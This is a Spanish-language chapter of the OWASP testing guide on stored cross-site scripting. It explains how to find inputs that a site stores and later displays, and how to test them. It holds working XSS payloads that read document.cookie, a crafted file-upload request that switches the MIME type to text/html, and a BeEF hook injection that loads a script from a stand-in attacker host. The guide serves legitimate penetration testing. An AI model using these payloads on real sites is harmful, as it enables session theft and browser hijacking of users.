Cross Site Scripting almacenado

ID
WSTG-INJT-02

Resumen

El Cross-site Scripting (XSS) almacenado es el tipo más peligroso de Cross Site Scripting. Las aplicaciones web que permiten a los usuarios almacenar datos están potencialmente expuestas a este tipo de ataque. Este capítulo ilustra ejemplos de inyección de cross site scripting almacenado y escenarios de explotación relacionados.

El XSS almacenado ocurre cuando una aplicación web recopila una entrada de un usuario que podría ser maliciosa y luego la guarda en un almacén de datos para usarla más adelante. La entrada almacenada no se filtra correctamente. Como consecuencia, los datos maliciosos parecerán formar parte del sitio y se ejecutarán en el navegador del usuario con los privilegios de la aplicación web. Dado que esta vulnerabilidad suele implicar al menos dos peticiones a la aplicación, también puede denominarse XSS de segundo orden.

Esta vulnerabilidad puede utilizarse para realizar diversos ataques basados en el navegador, entre ellos:

  • Secuestro del navegador de otro usuario
  • Captura de información sensible vista por los usuarios de la aplicación
  • Pseudo defacement de la aplicación
  • Escaneo de puertos de hosts internos ("internos" en relación con los usuarios de la aplicación web)
  • Entrega dirigida de exploits basados en el navegador
  • Otras actividades maliciosas

El XSS almacenado no requiere que la víctima haga clic en un enlace malicioso: la explotación ocurre cuando un usuario visita una página con un XSS almacenado. Las siguientes fases corresponden a un escenario típico de ataque XSS almacenado:

  • El atacante almacena código malicioso en la página vulnerable
  • La víctima se autentica en la aplicación
  • La víctima ve la página vulnerable
  • El navegador de la víctima ejecuta el código malicioso

Este tipo de ataque también puede explotarse con frameworks de explotación de navegadores como BeEF. Estos frameworks permiten desarrollar exploits complejos en JavaScript.

El XSS almacenado es particularmente peligroso en las áreas de la aplicación a las que acceden usuarios con privilegios elevados. Cuando el administrador visita la página vulnerable, su navegador ejecuta automáticamente el ataque. Esto podría exponer información sensible, como los tokens de autorización de sesión.

Objetivos de la prueba

  • Identificar la entrada almacenada que se refleja en el lado del cliente.
  • Evaluar la entrada que aceptan y la codificación que se aplica al devolverla (si la hay).

Cómo probar

Pruebas de caja negra

El proceso para identificar vulnerabilidades XSS almacenado es similar al descrito para el XSS reflejado.

Formularios de entrada

El primer paso consiste en identificar todos los puntos donde la entrada del usuario se almacena en el backend y luego la aplicación la muestra. Se pueden encontrar ejemplos típicos de entrada de usuario almacenada en:

  • Página de usuario/perfil: la aplicación permite al usuario editar o cambiar los datos del perfil, como nombre, apellido, apodo, avatar, imagen, dirección, etc.
  • Carrito de compras: la aplicación permite al usuario guardar artículos en el carrito de compras para revisarlos más tarde
  • Administrador de archivos: aplicación que permite la carga de archivos
  • Configuración o preferencias de la aplicación: aplicación que permite al usuario establecer preferencias
  • Foro o tablón de mensajes: aplicación que permite el intercambio de publicaciones entre usuarios
  • Blog: si la aplicación de blog permite a los usuarios enviar comentarios
  • Log: si la aplicación almacena en logs parte de la entrada de los usuarios.

Nota: Esto también puede incluir rutas de URL, cookies, cabeceras HTTP y otros tipos menos evidentes de entrada de usuario, así como parámetros GET y POST.

Analizar el código HTML

La entrada almacenada por la aplicación se usa normalmente en etiquetas HTML, pero también puede encontrarse como parte de contenido JavaScript. En esta etapa es fundamental entender si la entrada se almacena y cómo se posiciona en el contexto de la página. A diferencia del XSS reflejado, el pentester también debe investigar cualquier canal fuera de banda (out-of-band) a través del cual la aplicación reciba y almacene entrada de los usuarios, como el correo electrónico o la integración con aplicaciones externas.

Nota: Se deben probar todas las áreas de la aplicación accesibles para los administradores con el fin de identificar la presencia de datos enviados por los usuarios.

Ejemplo: correo electrónico almacenado en index2.php


Figura 4.7.2-1: Ejemplo de entrada almacenada

El código HTML de index2.php donde se encuentra el valor del correo electrónico:

<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />

En este caso, el evaluador necesita encontrar la forma de inyectar código fuera de la etiqueta <input>, como se muestra a continuación:

<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />

XSS almacenado

Esto implica probar los controles de validación de entrada y de filtrado de la aplicación. Ejemplos básicos de inyección en este caso:

  • aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
  • aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E

Hay que asegurarse de que la entrada se envíe a través de la aplicación. Normalmente esto implica desactivar JavaScript si se han implementado controles de seguridad del lado del cliente o modificar la petición HTTP con un proxy web. También es importante probar la misma inyección tanto con peticiones HTTP GET como POST. La inyección anterior da como resultado una ventana emergente que contiene los valores de las cookies.


Figura 4.7.2-2: Ejemplo de entrada almacenada

El código HTML tras la inyección:

<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>

La entrada se almacena y el navegador ejecuta el payload (carga útil) XSS al recargar la página. Si la aplicación escapa la entrada, los evaluadores deben probar si la aplicación tiene filtros XSS. Por ejemplo, si la cadena "SCRIPT" se reemplaza por un espacio o por un carácter NULL, esto podría ser un indicio de que hay un filtrado XSS en acción. Existen muchas técnicas para evadir los filtros de entrada (véase el capítulo de XSS reflejado). Se recomienda encarecidamente que los evaluadores consulten XSS Filter Evasion y otras páginas de XSS Cheat, que ofrecen una lista extensa de ataques XSS y de formas de eludir el filtrado. Consúltense las secciones de whitepapers y herramientas para obtener información más detallada.

Aprovechar el XSS almacenado con BeEF

El XSS almacenado puede explotarse con frameworks avanzados de explotación de JavaScript como BeEF.

Un escenario típico de explotación con BeEF implica:

  • Inyectar un hook de JavaScript que se comunica con el framework de explotación de navegadores del atacante (BeEF)
  • Esperar a que el usuario de la aplicación vea la página vulnerable donde se muestra la entrada almacenada
  • Controlar el navegador del usuario de la aplicación mediante la consola de BeEF

El hook de JavaScript puede inyectarse explotando la vulnerabilidad XSS de la aplicación web.

Ejemplo: inyección de BeEF en index2.php:

aaa@aa.com"><script src=https://attackersite/hook.js></script>

Cuando el usuario carga la página index2.php, el navegador ejecuta el script hook.js. Entonces es posible acceder a las cookies, a una captura de pantalla del usuario y a su portapapeles, y lanzar ataques XSS complejos.


Figura 4.7.2-3: Ejemplo de inyección de BeEF

Este ataque es particularmente eficaz en páginas vulnerables que son vistas por muchos usuarios con distintos privilegios.

Carga de archivos

Si la aplicación web permite la carga de archivos, es importante comprobar si es posible subir contenido HTML. Por ejemplo, si se permiten archivos HTML o TXT, se puede inyectar un payload XSS en el archivo subido. El pentester también debe verificar si la carga de archivos permite establecer tipos MIME arbitrarios.

Considérese la siguiente petición HTTP POST para la carga de un archivo:

POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test

Este fallo de diseño puede explotarse en ataques de manejo incorrecto de MIME por parte del navegador. Por ejemplo, archivos de apariencia inocua, como JPG y GIF, pueden contener un payload XSS que se ejecuta cuando el navegador los carga. Esto es posible cuando el tipo MIME de una imagen, como image/gif, puede establecerse en cambio como text/html. En ese caso, el navegador del cliente tratará el archivo como HTML.

Petición HTTP POST manipulada:

Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>

Hay que tener en cuenta también que los navegadores antiguos, como Internet Explorer, pueden no manejar los tipos MIME de la misma manera que Firefox, Chrome o Edge. Por ejemplo, Internet Explorer trataba como HTML algunos archivos TXT que contenían HTML. Para más información sobre el manejo de MIME, consúltese la sección de whitepapers al final de este capítulo.

Cross-site Scripting ciego

El Cross-site Scripting ciego (blind) es una forma de XSS almacenado. Generalmente ocurre cuando el payload del atacante se guarda en el servidor o la infraestructura y luego la aplicación de backend lo refleja de vuelta a la víctima. Por ejemplo, en formularios de comentarios, un atacante puede enviar el payload malicioso mediante el formulario y, cuando el usuario o administrador del backend de la aplicación ve el envío del atacante a través de la aplicación de backend, el payload del atacante se ejecutará. El Cross-site Scripting ciego es difícil de confirmar en escenarios reales, pero una de las mejores herramientas para ello es XSS Hunter.

Nota: Los evaluadores deben considerar cuidadosamente las implicaciones de privacidad de usar servicios públicos o de terceros al realizar pruebas de seguridad. (Véase #herramientas.)

Pruebas de caja gris

Las pruebas de caja gris son similares a las de caja negra. En ellas, el pentester tiene un conocimiento parcial de la aplicación. En este caso, el pentester podría conocer información sobre la entrada del usuario, los controles de validación de entrada y el almacenamiento de datos.

Según la información disponible, normalmente se recomienda que los evaluadores comprueben cómo procesa la aplicación la entrada del usuario y luego la almacena en el sistema de backend. Se recomiendan los siguientes pasos:

  • Usar la aplicación de frontend e introducir entradas con caracteres especiales o no válidos
  • Analizar la(s) respuesta(s) de la aplicación
  • Identificar la presencia de controles de validación de entrada
  • Acceder al sistema de backend y comprobar si la entrada se almacena y cómo se almacena
  • Analizar el código fuente y entender cómo la aplicación muestra la entrada almacenada

Si se dispone del código fuente (como en las pruebas de caja blanca), deben analizarse todas las variables usadas en los formularios de entrada. En particular, lenguajes de programación como PHP, ASP y JSP utilizan variables y funciones predefinidas para almacenar la entrada de las peticiones HTTP GET y POST.

La siguiente tabla resume algunas variables y funciones especiales que hay que revisar al analizar el código fuente:

PHP ASP JSP
$_GET - variables HTTP GET Request.QueryString - HTTP GET servlets doGet, doPost - HTTP GET y POST
$_POST - variables HTTP POST Request.Form - HTTP POST request.getParameter - variables HTTP GET/POST
$_REQUEST - variables HTTP POST, GET y COOKIE Server.CreateObject - se usa para cargar archivos
$_FILES - variables de carga de archivos HTTP
$_SERVER - cabeceras HTTP

Nota: La tabla anterior es solo un resumen de los parámetros más importantes, pero deben investigarse todos los parámetros de entrada del usuario.

Herramientas

  • Hackvertor es una herramienta en línea que permite muchos tipos de codificación y ofuscación de JavaScript (o de cualquier cadena de entrada).
  • BeEF es el browser exploitation framework. Una herramienta profesional para demostrar el impacto en tiempo real de las vulnerabilidades de los navegadores.
  • Burp Proxy es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web.
  • XSS Assistant es un script de Greasemonkey que permite a los usuarios probar fácilmente cualquier aplicación web en busca de fallos de cross-site scripting.
  • Zed Attack Proxy (ZAP) es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web con un escáner integrado.
  • XSS Hunter Portable XSS Hunter encuentra todo tipo de vulnerabilidades de cross-site scripting, incluido el XSS ciego, que a menudo se pasa por alto.
